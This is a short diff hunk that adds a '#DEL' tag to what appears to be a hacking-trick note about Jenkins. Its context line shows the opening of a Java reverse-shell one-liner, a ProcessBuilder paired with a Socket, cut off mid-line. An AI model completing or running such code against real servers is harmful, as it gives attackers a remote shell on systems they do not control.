@@ -18,4 +18,4 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 Tags:
 
-    #hacking #trick #jenkins 
+    #hacking #trick #jenkins #DEL
